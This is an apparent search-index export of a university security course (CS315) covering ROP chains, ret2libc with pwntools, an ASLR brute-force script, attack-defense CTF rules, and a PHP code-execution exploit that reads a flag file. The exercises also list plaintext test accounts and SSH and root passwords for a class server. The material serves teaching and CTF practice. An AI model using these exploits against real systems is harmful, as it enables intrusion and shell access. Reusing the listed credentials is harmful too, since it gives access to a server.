The RDI gadget then ret s into our RSI gadget: RIP = 0x400c03 (pop rsi) RDI = 0xdeadbeef RSI = UNKNOWN 0xffff0028: 0x400d00 // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled 0xffff0020: 0x1337beef // value we want in r15 (probably garbage) RSP -> 0xffff0018: 0x1337beef // value we want in rsi RSI and R15 are popped: RIP = 0x400c05 (ret) RDI = 0xdeadbeef RSI = 0x1337beef RSP -> 0xffff0028: 0x400d00 // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled And finally, the RSI gadget ret s, jumping to whatever function we want, but now with RDI and RSI set to values we control.","title":"Example"},{"location":"CS315/Week%2013/#rop-syscall-execv","text":"The objective is to call the syscall (execv) from a ROP controlling the value of registries: RDI, RSI, RDX, RAX and obviously the RIP (the other ones doesn't matters), and controlling somewhere to write \"/bin/sh\" RDI: Pointing to the string \"/bin/bash\" RSI: Null RDX: Null RAX: Value 0x3b for x64 and 0xb for x32, because this will call execv ROPgadget --binary vulnbinary | grep syscall ROPgadget --binary vulnbinary | grep \"rdi\\|rsi\\|rdx\\|rax\" | grep pop","title":"ROP - Syscall execv"},{"location":"CS315/Week%2013/#writing","text":"If you can somehow write to an address and then get the address of where you have written then this step is unnecessary. Elsewhere, you may search for some write-what-where. As is explained in this tutorial: https://failingsilently.wordpress.com/2017/12/14/rop-chain-shell/ you have to find something that allows you to save some value inside a registry and then save it to some controlled address inside another registry. For example some pop eax; ret , pop edx: ret , mov eax, [edx] You can find mov gadgets doing: ROPgadget --binary vulnbinary | grep mov","title":"Writing"},{"location":"CS315/Week%2013/#finding-a-place-to-write","text":"If you have found some write-what-where and can control the needed registries to call execv, there is only left finding a place to write. objdump -x vulnbinary | grep \".bss\" -B1 CONTENTS, ALLOC, LOAD, DATA 23 .bss 00000010 00403418 00403418 00002418 23 In this case: 0x403418","title":"Finding a place to write"},{"location":"CS315/Week%2013/#writing-binsh","text":"buffer += address(pop_eax) # place value into EAX buffer += \"/bin\" # 4 bytes at a time buffer += address(pop_edx) # place value into edx buffer += address(writable_memory) buffer += address(writewhatwhere) buffer += address(pop_eax) buffer += \"//sh\" buffer += address(pop_edx) buffer += address(writable_memory + 4) buffer += address(writewhatwhere)","title":"Writing \"/bin/sh\""},{"location":"CS315/Week%2013/#rop-leaking-libc-address","text":"","title":"ROP - Leaking LIBC address"},{"location":"CS315/Week%2013/#quick-resume","text":"Find overflow offset Find POP_RDI, PUTS_PLT and MAIN_PLT gadgets Find memory address of puts and guess the libc version (donwload it) Given the library just exploit it","title":"Quick Resume"},{"location":"CS315/Week%2013/#other-tutorials-and-binaries-to-practice","text":"This tutorial is going to exploit the code/binary proposed in this tutorial: https://tasteofsecurity.com/security/ret2libc-unknown-libc/ Another useful tutorial: https://made0x78.com/bseries-ret2libc/","title":"Other tutorials and binaries to practice"},{"location":"CS315/Week%2013/#code","text":"Filename: vuln.c #include <stdio.h> int main() { char buffer[32]; puts(\"Simple ROP.\\n\"); gets(buffer); return 0; } gcc -o vuln vuln.c -fno-stack-protector -no-pie","title":"Code"},{"location":"CS315/Week%2013/#rop-pwntools-template","text":"Find my ROP-PWNtools template here. I'm going to use the code located there to make the exploit. Download the exploit and place it in the same directory as the vulnerable binary.","title":"ROP - PWNtools template"},{"location":"CS315/Week%2013/#1-finding-the-offset","text":"The template need an offset before continuing with the exploit. If any is provided it will execute the necessary code to find it (by default OFFSET = \"\" ): #################### #### Find offset ### #################### OFFSET = \"\"#\"A\"*72 if OFFSET == \"\": gdb.attach(p.pid, \"c\") #Attach and continue payload = cyclic(1000) print(r.clean()) r.sendline(payload) #x/wx $rsp -- Search for bytes that crashed the application #cyclic_find(0x6161616b) # Find the offset of those bytes return Execute python template.py a GDB console will be opened with the program being crashed. Inside that GDB console execute x/wx $rsp to get the bytes that were going to overwrite the RIP. Finally get the offset using a python console: from pwn import * cyclic_find(0x6161616b) After finding the offset (in this case 40) change the OFFSET variable inside the template using that value. OFFSET = \"A\" * 40","title":"1- Finding the offset"},{"location":"CS315/Week%2013/#2-finding-gadgets","text":"Now we need to find ROP gadgets inside the binary. This ROP gadgets will be useful to call puts to find the libc being used, and later to launch the final exploit. PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols[\"puts\"] # This is also valid to call puts MAIN_PLT = elf.symbols['main'] POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep \"pop rdi\" RET = (rop.find_gadget(['ret']))[0] log.info(\"Main start: \" + hex(MAIN_PLT)) log.info(\"Puts plt: \" + hex(PUTS_PLT)) log.info(\"pop rdi; ret gadget: \" + hex(POP_RDI)) The PUTS_PLT is needed to call the function puts. The MAIN_PLT is needed to call the main function again after one interaction to exploit the overflow again (infinite rounds of exploitation).It is used at the end of each ROP. The POP_RDI is needed to pass a parameter to the called function. In this step you don't need to execute anything as everything will be found by pwntools during the execution.","title":"2- Finding Gadgets"},{"location":"CS315/Week%2013/#3-finding-libc-library","text":"Now is time to find which version of the libc library is being used. To do so we are going to leak the address in memory of the function puts and then we are going to search in which library version the puts version is in that address. def get_addr(func_name): FUNC_GOT = elf.got[func_name] log.info(func_name + \" GOT @ \" + hex(FUNC_GOT)) # Create rop chain rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT) #Send our rop-chain payload #p.sendlineafter(\"dah?\", rop1) #Interesting to send in a specific moment print(p.clean()) # clean socket buffer (read all and print) p.sendline(rop1) #Parse leaked address recieved = p.recvline().strip() leak = u64(recieved.ljust(8, \"\\x00\")) log.info(\"Leaked libc address, \"+func_name+\": \"+ hex(leak)) #If not libc yet, stop here if libc != \"\": libc.address = leak - libc.symbols[func_name] #Save libc base log.info(\"libc base @ %s\" % hex(libc.address)) return hex(leak) get_addr(\"puts\") #Search for puts address in memmory to obtains libc base if libc == \"\": print(\"Find the libc library and continue with the exploit... (https://libc.blukat.me/)\") p.interactive() To do so, the most important line of the executed code is: rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT) This will send some bytes util overwriting the RIP is possible: OFFSET . Then, it will set the address of the gadget POP_RDI so the next address ( FUNC_GOT ) will be saved in the RDI registry. This is because we want to call puts passing it the address of the PUTS_GOT as the address in memory of puts function is saved in the address pointing by PUTS_GOT . After that, PUTS_PLT will be called (with PUTS_GOT inside the RDI) so puts will read the content inside PUTS_GOT (the address of puts function in memory) and will print it out. Finally, main function is called again so we can exploit the overflow again. This way we have tricked puts function to print out the address in memory of the function puts (which is inside libc library). Now that we have that address we can search which libc version is being used. As we are exploiting some local binary it is not needed to figure out which version of libc is being used (just find the library in /lib/x86_64-linux-gnu/libc.so.6 ). But, in a remote exploit case I will explain here how can you find it:","title":"3- Finding LIBC library"},{"location":"CS315/Week%2013/#31-searching-for-libc-version-1","text":"You can search which library is being used in the web page: https://libc.blukat.me/ It will also allow you to download the discovered version of libc","title":"3.1- Searching for libc version (1)"},{"location":"CS315/Week%2013/#32-searching-for-libc-version-2","text":"You can also do: $ git clone https://github.com/niklasb/libc-database.git $ cd libc-database $ ./get This will take some time, be patient. For this to work we need: Libc symbol name: puts Leaked libc adddress: 0x7ff629878690 We can figure out which libc that is most likely used. ./find puts 0x7ff629878690 ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64) archive-glibc (id libc6_2.23-0ubuntu11_amd64) We get 2 matches (you should try the second one if the first one is not working). Download the first one: ./download libc6_2.23-0ubuntu10_amd64 Getting libc6_2.23-0ubuntu10_amd64 -> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb -> Downloading package -> Extracting package -> Package saved to libs/libc6_2.23-0ubuntu10_amd64 Copy the libc from libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so to our working directory.","title":"3.2- Searching for libc version (2)"},{"location":"CS315/Week%2013/#33-other-functions-to-leak","text":"puts printf __libc_start_main read gets","title":"3.3- Other functions to leak"},{"location":"CS315/Week%2013/#4-finding-based-libc-address-exploiting","text":"At this point we should know the libc library used. As we are exploiting a local binary I will use just: /lib/x86_64-linux-gnu/libc.so.6 So, at the begging of template.py change the libc variable to: libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") #Set library path when know it Giving the path to the libc library the rest of the exploit is going to be automatically calculated. Inside the get_addr function the base address of libc is going to be calculated: if libc != \"\": libc.address = leak - libc.symbols[func_name] #Save libc base log.info(\"libc base @ %s\" % hex(libc.address)) Then, the address to the function system and the address to the string \"/bin/sh\" are going to be calculated from the base address of libc and given the libc library. BINSH = next(libc.search(\"/bin/sh\")) - 64 #Verify with find /bin/sh SYSTEM = libc.sym[\"system\"] EXIT = libc.sym[\"exit\"] log.info(\"bin/sh %s \" % hex(BINSH)) log.info(\"system %s \" % hex(SYSTEM)) Finally, the /bin/sh execution exploit is going to be prepared sent: rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT) p.clean() p.sendline(rop2) ##### Interact with the shell ##### p.interactive() #Interact with the conenction Let's explain this final ROP. The last ROP ( rop1 ) ended calling again the main function, then we can exploit again the overflow (that's why the OFFSET is here again). Then, we want to call POP_RDI pointing to the addres of \"/bin/sh\" ( BINSH ) and call system function ( SYSTEM ) because the address of \"/bin/sh\" will be passed as a parameter. Finally, the address of exit function is called so the process exists nicely and any alert is generated. This way the exploit will execute a /bin/sh shell.","title":"4- Finding based libc address &amp; exploiting"},{"location":"CS315/Week%2013/#42-using-one_gadget","text":"You could also use ONE_GADGET to obtain a shell instead of using system and \"/bin/sh\". ONE_GADGET will find inside the libc library some way to obtain a shell using just one ROP. However, normally there are some constrains, the most common ones and easy to avoid are like [rsp+0x30] == NULL As you control the values inside the RSP you just have to send some more NULL values so the constrain is avoided. ONE_GADGET = libc.address + 0x4526a rop2 = base + p64(ONE_GADGET) + \"\\x00\"*100","title":"4(2)- Using ONE_GADGET"},{"location":"CS315/Week%2013/#exploit-file","text":"You can find a template to exploit this vulnerability here: ROP-PWN template","title":"EXPLOIT FILE"},{"location":"CS315/Week%2013/#common-problems","text":"","title":"Common problems"},{"location":"CS315/Week%2013/#main_plt-elfsymbolsmain-not-found","text":"If the \"main\" symbol does not exist. Then you can just where is the main code: objdump -d vuln_binary | grep \"\\.text\" Disassembly of section .text: 0000000000401080 <.text>: and set the address manually: MAIN_PLT = 0x401080","title":"MAIN_PLT = elf.symbols['main'] not found"},{"location":"CS315/Week%2013/#puts-not-found","text":"If the binary is not using Puts you should check if it is using","title":"Puts not found"},{"location":"CS315/Week%2013/#sh-1-ssssssss-not-found","text":"If you find this error after creating all the exploit: sh: 1: %s%s%s%s%s%s%s%s: not found Try to subtract 64 bytes to the address of \"/bin/sh\": BINSH = next(libc.search(\"/bin/sh\")) - 64","title":"sh: 1: %s%s%s%s%s%s%s%s: not found"},{"location":"CS315/Week%2013/#ret2lib","text":"If you have found a vulnerable binary and you think that you can exploit it using Ret2Lib here you can find some basic steps that you can follow.","title":"Ret2Lib"},{"location":"CS315/Week%2013/#if-you-are-inside-the-host","text":"","title":"If you are inside the host"},{"location":"CS315/Week%2013/#you-can-find-the-address-of-libc","text":"ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time) If you want to check if the ASLR is changing the address of libc you can do: for i in `seq 0 20`; do ldd <Ejecutable> | grep libc; done","title":"You can find the address of libc"},{"location":"CS315/Week%2013/#get-offset-of-system-function","text":"readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system","title":"Get offset of system function"},{"location":"CS315/Week%2013/#get-offset-of-binsh","text":"strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh","title":"Get offset of \"/bin/sh\""},{"location":"CS315/Week%2013/#procmaps","text":"If the process is creating children every time you talk with it (network server) try to read that file (probably you will need to be root). Here you can find exactly where is the libc loaded inside the process and where is going to be loaded for every children of the process. In this case it is loaded in 0xb75dc000 (This will be the base address of libc)","title":"/proc/\\/maps"},{"location":"CS315/Week%2013/#using-gdb-peda","text":"Get address of system function, of exit function and of the string \"/bin/sh\" using gdb-peda: p system p exit find \"/bin/sh\"","title":"Using gdb-peda"},{"location":"CS315/Week%2013/#bypassing-aslr","text":"You can try to bruteforce the abse address of libc. for off in range(0xb7000000, 0xb8000000, 0x1000):","title":"Bypassing ASLR"},{"location":"CS315/Week%2013/#code_1","text":"from pwn import * c = remote('192.168.85.181',20002) c.recvline() #Banner for off in range(0xb7000000, 0xb8000000, 0x1000): p = \"\" p += p32(off + 0x0003cb20) #system p += \"CCCC\" #GARBAGE p += p32(off + 0x001388da) #/bin/sh payload = 'A'*0x20010 + p c.send(payload) c.interactive() #?","title":"Code"},{"location":"CS315/Week%2013/#exercise","text":"","title":"Exercise"},{"location":"CS315/Week%2013/#5-pt-ret2win","text":"Challenge is from https://ropemporium.com/challenge/ret2win.html If you are interested in the ROP exploit, please take a look at ROP Emporium. Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack. nc 103.102.44.218 10001 Download binary x86_64 ELF: https://ropemporium.com/binary/ret2win.zip Hint: check the LET'S DO THIS part of original challenge.","title":"(5 pt) ret2win"},{"location":"CS315/Week%2013/#5-pt-awd-prepare","text":"We know that we are going to have a AWD CTF next week. Make sure you have access to the test AWD environment. Check the demo challenge and try to hack it to get a flag. Browser the page http://103.102.44.218:23333/ in your browser, login with some test account below: Account\uff1aTEST1 Password\uff1aYpkyiQDwGHLjoOk3 Account\uff1aTEST2 Password\uff1apQXBpiFPlNBB6TUt Account\uff1aTEST3 Password\uff1acUMvgNGCb64E4uLv Account\uff1aTEST4 Password\uff1aRQGqtTfK6601c7qY Account\uff1aTEST5 Password\uff1aSVtm4Pd3vtAaeQvZ Account\uff1aTEST6 Password\uff1alNTrEnx586taV8Ow Account\uff1aTEST7 Password\uff1awXxFkOsGcpb1XsIo Account\uff1aTEST8 Password\uff1aAhcNEZpaBWAm3Jst Account\uff1aTEST9 Password\uff1alxqzbu9tjkshQ0oB Account\uff1aTEST10 Password\uff1abRewQknqeY3yrZCc The flag file is located in /var/flag/flag.txt . The application files are under /app . You have the permission to read and modify the application files. During the AWD CTF, you can only access ctf user. Here's the account information: IP address: 103.102.44.218 Service port: 20000-20009 SSH port: 30000-30009 Username: ctf Password: 123456 Further, only for testing, you have the root password: Username: root Password: rootpassword Please DO NOT change the password of the users during testing. In this challenge, you should post those screenshots in your writeup: The screenshot of the port 2000x: make sure the PHP code is shown. \u200b In the browser: http://103.102.44.218:2000x/ The screenshot of the successful login to port 3000x: make sure you can access the server from user ctf . \u200b In the terminal: ssh ctf@103.102.44.218 -p 3000x The screenshot of the flag.txt content. \u200b In the ssh session: cat /var/flag/flag.txt Hope you enjoy the AWD. Q&As: Q: How to modify the file on the server? A: Use scp command to transfer files through network. Download the file to you local machine and modify, after that then push the file to the server. For example: scp -P 30000 ctf@103.102.44.218:/app/index.php ./ <modify> scp -P 30000 ./index.php ctf@103.102.44.218:/app/index.php Q: Can I install software on the server (vim for example)? A: You can't install software through apt. But if you have other methods, they're allowed. Q: Can I delete flag.txt after I read it? A: You can't. Only root can modify flag.txt.","title":"(5 pt) AWD prepare"},{"location":"CS315/Week%2014/","text":"Week14 CTF: Attack-Defense CTF An Attack/Defense Capture the Flag is a type of cybersecurity competition where competing teams attempt to find security vulnerabilities in services run by the opposing teams. Each team works finding vulnerabilities in other team\u2019s services while protecting their own, hence \u201cattack/defense\u201d. (image from CTF.zone ) All teams are given an image to host on servers, usually a Linux distribution with code for several services that the game creators made. For example, in this year\u2019s saarCTF , there were some simple websites for food reviews and calendar events hosted on a linux server. All teams get the same images, so if you find a vulnerability in your server, you can use it to attack other teams\u2019. When the competition starts, you gain access to the servers and can start reading the code and looking for vulnerabilities. The game admins will use your service (programmatically) as normal users and place \u201cflags\u201d for other teams to steal if they find vulnerabilities. For example, they might create private events in the calendar app mentioned earlier, and the flags would be in the details of the event. Vulnerabilities are generally intentionally placed, though sometimes game creators make mistakes and there are extra unintentional attack paths. Competitions tend to have a range of easy to more complicated exploits. A simple exploit might be finding that the view_calendar_event function takes in a uid from the request, and doesn\u2019t validate that this is the same user as the logged in user. A more complicated exploit could involve a buffer overflow leading to a remote code execution. There\u2019s also been exploits using less traditional methods, like adversarial machine learning: fausecteam/faustctf-2018-jodlgang . After finding a vulnerability, the next step is to build a script to exploit it on other teams\u2019 servers and patch the issue on your own server. Points are determined based on how many opposing teams you\u2019re able to steal flags from and how many flags you successfully prevent other teams from stealing. Rules Competition start time: 2021-12-13 21:00 Competition end time: 2021-12-16 21:00 Time per round: 5 minutes (864 rounds in total) Score per round: 50 Challenges: Sanity_check (web) Calculator (web) Binary (pwn) Image manipulator (web) Blog (web) Base score per challenge: 1000 Total teams: 50 Flag location: /var/flag.txt SSH user: ctf SSH default password: 123456 Challenges The AWD CTF has 5 challenges in total. Involving 4 web and 1 pwn. Sanity_check This challenge is simple PHP script: The script requires one parameter called str , and gives out the length of the string. For example, a valid request might be: http://ip:port/?str=some_example_string The page would response the following text: some_example_string length is 19 Calculator The website is written in PHP. The calculator has only 1 function: to calculate the input equation of user. An example input of 2*3 would result in 6 . Binary This challenge doesn't offer any source code. However, you can modify the binary ELF file with any hex editor or de-compiler. First of all, we are given 5 choices: 1.register 2.login 3.reset passwd 4.play game 5.logout Your choice: We need to register and then login. After that, we can play this game. By choosing 4, the game begins: 1.name your city 2.rename your city 3.manage your shop 4.manage your army 5.show your city 6.battle 7.back Your choice: We can name cities, manage shops, and manage army. After everything is done, we would like to battle. However, the game is too difficult. Most of the time, we only have the bad ending. Image manipulator This web app allows us to manipulate the images. We can upload a file and modify those information: 1. width and height 2. crop the image 3. rotate the image 4. flip 5. mirror 6. grayscale 7. sepia Let's take a look at the source code. In the /usr/bin/gs file is the ghostscript . Ghostscript is an interpreter for PostScript Portable Document Format (PDF) files. app \u251c\u2500\u2500 App.php \u251c\u2500\u2500 Driver \u2502 \u251c\u2500\u2500 Base.php \u2502 \u251c\u2500\u2500 Convert.php \u2502 \u251c\u2500\u2500 Image.php \u2502 \u2514\u2500\u2500 index.html \u251c\u2500\u2500 Template \u2502 \u251c\u2500\u2500 index.html \u2502 \u2514\u2500\u2500 main.html \u251c\u2500\u2500 assets \u2502 \u251c\u2500\u2500 index.html \u2502 \u2514\u2500\u2500 main.css \u251c\u2500\u2500 inc.php \u2514\u2500\u2500 index.php Under the app folder is the main structure of the website. The website is written by PHP. An index.php hooks all the files to work together. inc.php : defines some folder location. App.php : main logic of the website. Sends all requests to target file. assets : static pages. Template : static web html style. Driver : you should look at files under this folder and find out the vulnerabilities. Blog Blog is a fully functional blog website with all pages you need. The website contains a database of MySQL on 3306. And based on the zblog template. Blog has a CMS and you should check out the installation first. Let's look at the source code. src \u251c\u2500\u2500 feed.php \u251c\u2500\u2500 index.php \u251c\u2500\u2500 search.php \u251c\u2500\u2500 zb_install \u251c\u2500\u2500 zb_system \u2514\u2500\u2500 zb_users There are 3 major folders under the source code. Firstly, zb_install takes all the installation options and instructions to setup a website. ab_system is the main function of the website admin panel. zb_users takes all user functions. Notification The AWD platform is using HTTP , which means it's possible to analyze network traffic of others. No root privilege. Using of 0day is valid . DDoS or other brute DoS are NOT valid . Never share flag with others. Prepare Before the AWD CTF, you should check the following list: Change the default password for each game box. Check all the services are running well. Scan the ports of other players. Read the source code and patch the vulnerabilities. Adjust your script to submit flag. Flag Submitter curl -X POST http://www.compass.college/api/flag -H \"Authorization: <token>\" -d \"{ \\\"flag\\\": \\\"your_flag_here\\\" }\" GitHub repo of an example flag submitter: https://github.com/0xaww/awd-submit-flag Exploit Script Using manual exploit is not efficient. By using automate script to exploit and submit the flag. An example exploit script of a SSTI vulnerability looks like: import requests url = \"\" data = { \"method\": \"__construct\", \"filter[]\": \"assert\", \"method\": \"get\", \"get[]\": \"die((new ReflectionFunction('syste'.'m'))->invoke('cat /var/flag.txt'))\", } print(requests.post(url, data=data).text) The script can be configured to run every 5 minutes or using flag submitter to hook the exploit script.","title":"Week14 CTF: Attack-Defense CTF"},{"location":"CS315/Week%2014/#week14-ctf-attack-defense-ctf","text":"An Attack/Defense Capture the Flag is a type of cybersecurity competition where competing teams attempt to find security vulnerabilities in services run by the opposing teams. Each team works finding vulnerabilities in other team\u2019s services while protecting their own, hence \u201cattack/defense\u201d. (image from CTF.zone ) All teams are given an image to host on servers, usually a Linux distribution with code for several services that the game creators made. For example, in this year\u2019s saarCTF , there were some simple websites for food reviews and calendar events hosted on a linux server. All teams get the same images, so if you find a vulnerability in your server, you can use it to attack other teams\u2019. When the competition starts, you gain access to the servers and can start reading the code and looking for vulnerabilities. The game admins will use your service (programmatically) as normal users and place \u201cflags\u201d for other teams to steal if they find vulnerabilities. For example, they might create private events in the calendar app mentioned earlier, and the flags would be in the details of the event. Vulnerabilities are generally intentionally placed, though sometimes game creators make mistakes and there are extra unintentional attack paths. Competitions tend to have a range of easy to more complicated exploits. A simple exploit might be finding that the view_calendar_event function takes in a uid from the request, and doesn\u2019t validate that this is the same user as the logged in user. A more complicated exploit could involve a buffer overflow leading to a remote code execution. There\u2019s also been exploits using less traditional methods, like adversarial machine learning: fausecteam/faustctf-2018-jodlgang . After finding a vulnerability, the next step is to build a script to exploit it on other teams\u2019 servers and patch the issue on your own server. Points are determined based on how many opposing teams you\u2019re able to steal flags from and how many flags you successfully prevent other teams from stealing.","title":"Week14 CTF: Attack-Defense CTF"},{"location":"CS315/Week%2014/#rules","text":"Competition start time: 2021-12-13 21:00 Competition end time: 2021-12-16 21:00 Time per round: 5 minutes (864 rounds in total) Score per round: 50 Challenges: Sanity_check (web) Calculator (web) Binary (pwn) Image manipulator (web) Blog (web) Base score per challenge: 1000 Total teams: 50 Flag location: /var/flag.txt SSH user: ctf SSH default password: 123456","title":"Rules"},{"location":"CS315/Week%2014/#challenges","text":"The AWD CTF has 5 challenges in total. Involving 4 web and 1 pwn.","title":"Challenges"},{"location":"CS315/Week%2014/#sanity_check","text":"This challenge is simple PHP script: The script requires one parameter called str , and gives out the length of the string. For example, a valid request might be: http://ip:port/?str=some_example_string The page would response the following text: some_example_string length is 19","title":"Sanity_check"},{"location":"CS315/Week%2014/#calculator","text":"The website is written in PHP. The calculator has only 1 function: to calculate the input equation of user. An example input of 2*3 would result in 6 .","title":"Calculator"},{"location":"CS315/Week%2014/#binary","text":"This challenge doesn't offer any source code. However, you can modify the binary ELF file with any hex editor or de-compiler. First of all, we are given 5 choices: 1.register 2.login 3.reset passwd 4.play game 5.logout Your choice: We need to register and then login. After that, we can play this game. By choosing 4, the game begins: 1.name your city 2.rename your city 3.manage your shop 4.manage your army 5.show your city 6.battle 7.back Your choice: We can name cities, manage shops, and manage army. After everything is done, we would like to battle. However, the game is too difficult. Most of the time, we only have the bad ending.","title":"Binary"},{"location":"CS315/Week%2014/#image-manipulator","text":"This web app allows us to manipulate the images. We can upload a file and modify those information: 1. width and height 2. crop the image 3. rotate the image 4. flip 5. mirror 6. grayscale 7. sepia Let's take a look at the source code. In the /usr/bin/gs file is the ghostscript . Ghostscript is an interpreter for PostScript Portable Document Format (PDF) files. app \u251c\u2500\u2500 App.php \u251c\u2500\u2500 Driver \u2502 \u251c\u2500\u2500 Base.php \u2502 \u251c\u2500\u2500 Convert.php \u2502 \u251c\u2500\u2500 Image.php \u2502 \u2514\u2500\u2500 index.html \u251c\u2500\u2500 Template \u2502 \u251c\u2500\u2500 index.html \u2502 \u2514\u2500\u2500 main.html \u251c\u2500\u2500 assets \u2502 \u251c\u2500\u2500 index.html \u2502 \u2514\u2500\u2500 main.css \u251c\u2500\u2500 inc.php \u2514\u2500\u2500 index.php Under the app folder is the main structure of the website. The website is written by PHP. An index.php hooks all the files to work together. inc.php : defines some folder location. App.php : main logic of the website. Sends all requests to target file. assets : static pages. Template : static web html style. Driver : you should look at files under this folder and find out the vulnerabilities.","title":"Image manipulator"},{"location":"CS315/Week%2014/#blog","text":"Blog is a fully functional blog website with all pages you need. The website contains a database of MySQL on 3306. And based on the zblog template. Blog has a CMS and you should check out the installation first. Let's look at the source code. src \u251c\u2500\u2500 feed.php \u251c\u2500\u2500 index.php \u251c\u2500\u2500 search.php \u251c\u2500\u2500 zb_install \u251c\u2500\u2500 zb_system \u2514\u2500\u2500 zb_users There are 3 major folders under the source code. Firstly, zb_install takes all the installation options and instructions to setup a website. ab_system is the main function of the website admin panel. zb_users takes all user functions.","title":"Blog"},{"location":"CS315/Week%2014/#notification","text":"The AWD platform is using HTTP , which means it's possible to analyze network traffic of others. No root privilege. Using of 0day is valid . DDoS or other brute DoS are NOT valid . Never share flag with others.","title":"Notification"},{"location":"CS315/Week%2014/#prepare","text":"Before the AWD CTF, you should check the following list: Change the default password for each game box. Check all the services are running well. Scan the ports of other players. Read the source code and patch the vulnerabilities. Adjust your script to submit flag.","title":"Prepare"},{"location":"CS315/Week%2014/#flag-submitter","text":"curl -X POST http://www.compass.college/api/flag -H \"Authorization: <token>\" -d \"{ \\\"flag\\\": \\\"your_flag_here\\\" }\" GitHub repo of an example flag submitter: https://github.com/0xaww/awd-submit-flag","title":"Flag Submitter"},{"location":"CS315/Week%2014/#exploit-script","text":"Using manual exploit is not efficient. By using automate script to exploit and submit the flag. An example exploit script of a SSTI vulnerability looks like: import requests url = \"\" data = { \"method\": \"__construct\", \"filter[]\": \"assert\", \"method\": \"get\", \"get[]\": \"die((new ReflectionFunction('syste'.'m'))->invoke('cat /var/flag.txt'))\", } print(requests.post(url, data=data).text) The script can be configured to run every 5 minutes or using flag submitter to hook the exploit script.","title":"Exploit Script"},{"location":"CS315/Week%202/","text":"Week 2 PWN: Basic Buffer Overflow Binary Exploitation Binaries, or executables, are machine code for a computer to execute. For the most part, the binaries that you will face in CTFs are Linux ELF files or the occasional windows executable. Binary Exploitation is a broad topic within Cyber Security which really comes down to finding a vulnerability in the program and exploiting it to gain control of a shell or modifying the program's functions. Common topics addressed by Binary Exploitation or 'pwn' challenges include: Registers The Stack Calling Conventions Global Offset Table (GOT) Buffers Buffer Overflow Return Oriented Programming (ROP) Binary Security No eXecute (NX) Address Space Layout Randomization (ASLR) Stack Canaries Relocation Read-Only (RELRO) The Heap Heap Exploitation Format String Vulnerability Buffers A buffer is any allocated space in memory where data (often user input) can be stored. For example, in the following C program name would be considered a stack buffer: #include <stdio.h> int main() { char name[64] = {0}; read(0, name, 63); printf(\"Hello %s\", name); return 0; } Buffers could also be global variables: #include <stdio.h> char name[64] = {0}; int main() { read(0, name, 63); printf(\"Hello %s\", name); return 0; } Or dynamically allocated on the heap: #include <stdio.h> #include <stdlib.h> int main() { char *name = malloc(64); memset(name, 0, 64); read(0, name, 63); printf(\"Hello %s\", name); return 0; } Exploits Given that buffers commonly hold user input, mistakes when writing to them could result in attacker controlled data being written outside of the buffer's space. Introduction to Stack A stack is an abstract data type frequently used in computer science. It has a property that the Last item placed will be the first to be removed from it ( LIFO ) . Several options are defined on the stack , the most important ones are push and pop . push add an element to the top of the stack , and pop removes elements from the top . /* The address of memory which is pointed by the Stack Pointer ( sp ) is the top of the stack */ \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 <\u2500 sp \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 : push 0x10 /* sp is incremented and the value is stored at that address */ \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 0x10 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 <\u2500 sp : push 0x20 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 0x10 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 0x20 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 <\u2500 sp : pop var /* The value pointed by the sp is removed from the stack and sp is decremented */ \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 0x10 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 <\u2500 sp Modern computers are designed with the need of high-level languages in mind. The most important technique for structuring programs introduced by high-level languages is the function. From one point of view, a function call alters the flow of control just as a jump does, but unlike a jump, when finished performing its task, a function returns control to the statement or instruction following the call. This high-level abstraction is implemented with the help of the stack. The stack is also used to allocate local variables , to pass parameters to the functions, and to store the information needed to return to caller function after the execution of the function gets over. The stack pointer is a special register which will always point to the top of the stack , in x86-32 bit this register is called esp .The area allocated on the stack for a function is called it's stack frame . and the registers ebp and esp (in x86-32 bit system )are used to specify the boundaries of the stack frame . The ebp will point to the staring of the stack frame of the current function and the esp register will point to the bottom. Buffer Overflow A Buffer Overflow is a vulnerability in which data can be written which exceeds the allocated space, allowing an attacker to overwrite other data. Stack buffer overflow The simplest and most common buffer overflow is one where the buffer is on the stack. Let's look at an example. #include <stdio.h> int main() { int secret = 0xdeadbeef; char name[100] = {0}; read(0, name, 0x100); if (secret == 0x1337) { puts(\"Wow! Here's a secret.\"); } else { puts(\"I guess you're not cool enough to see my secret\"); } } There's a tiny mistake in this program which will allow us to see the secret. name is decimal 100 bytes, however we're reading in hex 100 bytes (=256 decimal bytes)! Let's see how we can use this to our advantage. If the 